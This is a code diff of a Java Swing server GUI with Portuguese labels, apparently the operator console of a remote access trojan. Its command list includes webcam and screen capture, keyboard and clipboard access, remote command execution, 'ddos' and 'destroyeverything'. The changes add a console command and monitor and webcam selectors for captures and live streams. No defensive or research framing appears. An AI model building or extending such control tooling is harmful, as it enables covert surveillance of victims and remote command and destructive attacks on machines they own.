@@ -71,7 +71,7 @@ public class ServerGUI extends JFrame {
     private static final String[] ALL_COMMANDS = {
             "sel", "list", "help", "desel", "control", "mouse", "mousemove", "mousemoveclick", "keyboard", "duplicate", "fps", "ddos", "wallpaper",
             "functions", "functionspanel", "info", "restart", "debug", "gc", "ping", "ls", "del", "copy", "move", "mkdir", "cd", "open", "view", "receive",
-            "send", "destroyeverything", "download", "zip", "unzip", "audio", "type", "lclick", "mclick", "rclick", "scroll", "history", "screen",
+            "send", "destroyeverything", "download", "zip", "unzip", "audio", "type", "lclick", "mclick", "rclick", "scroll", "history", "screen", "console",
             "webcam", "livestopper", "cmd", "exec", "log", "kill", "listprocess", "clipboard", "msg", "ask", "chat", "voice", "update", "close", "uninstall"
     };
 
@@ -494,13 +494,28 @@ public class ServerGUI extends JFrame {
             protected void paintComponent(Graphics g) {
                 Graphics2D g2 = (Graphics2D) g.create();
                 g2.setRenderingHint(RenderingHints.KEY_ANTIALIASING, RenderingHints.VALUE_ANTIALIAS_ON);
-                // Fundo gradiente leve
-                GradientPaint gp = new GradientPaint(0, 0, new Color(30, 36, 34), 0, getHeight(), new Color(22, 26, 24));
-                g2.setPaint(gp);
-                g2.fillRoundRect(0, 0, getWidth(), getHeight(), 14, 14);
-                // Borda neon discreta
-                g2.setColor(new Color(60, 90, 70));
-                g2.drawRoundRect(0, 0, getWidth() - 1, getHeight() - 1, 14, 14);
+                Object state = getClientProperty("TOGGLE_STATE");
+                if ("ON".equals(state)) {
+                    g2.setPaint(new GradientPaint(0, 0, new Color(40, 90, 50), 0, getHeight(), new Color(20, 60, 30)));
+                    g2.fillRoundRect(0, 0, getWidth(), getHeight(), 14, 14);
+                    g2.setColor(NEON);
+                    g2.drawRoundRect(0, 0, getWidth() - 1, getHeight() - 1, 14, 14);
+                } else if ("LOADING".equals(state)) {
+                    g2.setPaint(new GradientPaint(0, 0, new Color(90, 90, 40), 0, getHeight(), new Color(60, 60, 20)));
+                    g2.fillRoundRect(0, 0, getWidth(), getHeight(), 14, 14);
+                    g2.setColor(Color.YELLOW);
+                    g2.drawRoundRect(0, 0, getWidth() - 1, getHeight() - 1, 14, 14);
+                } else if ("OFF".equals(state)) {
+                    g2.setPaint(new GradientPaint(0, 0, new Color(90, 40, 40), 0, getHeight(), new Color(60, 20, 20)));
+                    g2.fillRoundRect(0, 0, getWidth(), getHeight(), 14, 14);
+                    g2.setColor(new Color(255, 60, 60));
+                    g2.drawRoundRect(0, 0, getWidth() - 1, getHeight() - 1, 14, 14);
+                } else {
+                    g2.setPaint(new GradientPaint(0, 0, new Color(30, 36, 34), 0, getHeight(), new Color(22, 26, 24)));
+                    g2.fillRoundRect(0, 0, getWidth(), getHeight(), 14, 14);
+                    g2.setColor(new Color(60, 90, 70));
+                    g2.drawRoundRect(0, 0, getWidth() - 1, getHeight() - 1, 14, 14);
+                }
                 super.paintComponent(g2);
                 g2.dispose();
             }
@@ -564,7 +579,13 @@ public class ServerGUI extends JFrame {
     private JPanel sectionCommands() {
         JPanel commandsPanel = new GridCard("Comandos", 3, 2);
         commandsPanel.add(createInputActionButton("Executar", "cmd", "Digite o comando a executar:"));
-        commandsPanel.add(createInputActionButton("Comando em Processo", "exec", "Digite o id do processo e comando a executar:"));
+        commandsPanel.add(createInputActionButton("Console / Processo", "console", "ID do processo (deixe vazio p/ Console) e comando:", input -> {
+            String[] parts = input.trim().split(" ");
+            if (parts.length > 0 && parts[0].matches("\\d+")) {
+                return "exec";
+            }
+            return "console";
+        }));
         commandsPanel.add(createSimpleActionButton("Listar", "listprocess"));
         commandsPanel.add(createInputActionButton("Matar", "kill", "Digite o ID do processo:"));
         commandsPanel.add(createInputActionButton("Logs", "log", "Digite o ID do processo:"));
@@ -593,11 +614,45 @@ public class ServerGUI extends JFrame {
     }
 
     private JPanel sectionScreenWebcam() {
-        JPanel screenPanel = new GridCard("Tela e Webcam", 3, 2);
-        screenPanel.add(createSimpleActionButton("Print da Tela", "screen"));
-        screenPanel.add(createSimpleActionButton("Print da Webcam", "webcam"));
-        screenPanel.add(createSimpleActionButton("Transmissão de Tela", "screen 1 %fps%"));
-        screenPanel.add(createSimpleActionButton("Transmissão da Webcam", "webcam 1 %fps%"));
+        JPanel screenPanel = new GridCard("Tela e Webcam", 4, 2);
+
+        JSpinner screenSpinner = new JSpinner(new SpinnerNumberModel(1, 1, 10, 1));
+        JSpinner webcamSpinner = new JSpinner(new SpinnerNumberModel(1, 1, 10, 1));
+        screenSpinner.setToolTipText("ID do Monitor");
+        webcamSpinner.setToolTipText("ID da Webcam");
+
+        JButton btnPrintScreen = createButton("Print da Tela");
+        btnPrintScreen.addActionListener(e -> sendDirectCommand("screen " + screenSpinner.getValue()));
+        screenPanel.add(btnPrintScreen);
+
+        JButton btnPrintWebcam = createButton("Print da Webcam");
+        btnPrintWebcam.addActionListener(e -> sendDirectCommand("webcam " + webcamSpinner.getValue()));
+        screenPanel.add(btnPrintWebcam);
+
+        JPanel screenSelectPanel = new JPanel(new FlowLayout(FlowLayout.CENTER));
+        screenSelectPanel.setOpaque(false);
+        JLabel lblScreen = new JLabel("ID da Tela:");
+        lblScreen.setForeground(TEXT_MAIN);
+        screenSelectPanel.add(lblScreen);
+        screenSelectPanel.add(screenSpinner);
+        screenPanel.add(screenSelectPanel);
+
+        JPanel webcamSelectPanel = new JPanel(new FlowLayout(FlowLayout.CENTER));
+        webcamSelectPanel.setOpaque(false);
+        JLabel lblWebcam = new JLabel("ID da Webcam:");
+        lblWebcam.setForeground(TEXT_MAIN);
+        webcamSelectPanel.add(lblWebcam);
+        webcamSelectPanel.add(webcamSpinner);
+        screenPanel.add(webcamSelectPanel);
+
+        JButton btnLiveScreen = createButton("Transmissão de Tela");
+        btnLiveScreen.addActionListener(e -> sendDirectCommand("screen " + screenSpinner.getValue() + " " + ServerImageComponents.FPS));
+        screenPanel.add(btnLiveScreen);
+
+        JButton btnLiveWebcam = createButton("Transmissão da Webcam");
+        btnLiveWebcam.addActionListener(e -> sendDirectCommand("webcam " + webcamSpinner.getValue() + " " + ServerImageComponents.FPS));
+        screenPanel.add(btnLiveWebcam);
+
         screenPanel.add(createSimpleActionButton("Histórico da Tela", "history screen"));
         screenPanel.add(createSimpleActionButton("Histórico da Webcam", "history webcam"));
         return screenPanel;
@@ -716,7 +771,7 @@ public class ServerGUI extends JFrame {
             instance.logsArea.append(message + "\n");
             instance.logsArea.setCaretPosition(instance.logsArea.getDocument().getLength());
         }
-        System.out.println(message);
+        Connect.log(message);
     }
 
     // ====== Clientes (combo/tabela) ======
@@ -1086,8 +1141,9 @@ public class ServerGUI extends JFrame {
 
     public static void toggleColor(JButton button, boolean enabled) {
         if (button == null) return;
-        button.setBackground(enabled ? NEON : new Color(80, 30, 30));
-        button.setForeground(enabled ? Color.BLACK : TEXT_MAIN);
+        button.putClientProperty("TOGGLE_STATE", enabled ? "ON" : "OFF");
+        button.setForeground(Color.WHITE);
+        button.repaint();
     }
 
     // ====== Monitor de rede (mantido, mas atualiza header/status além do título) ======
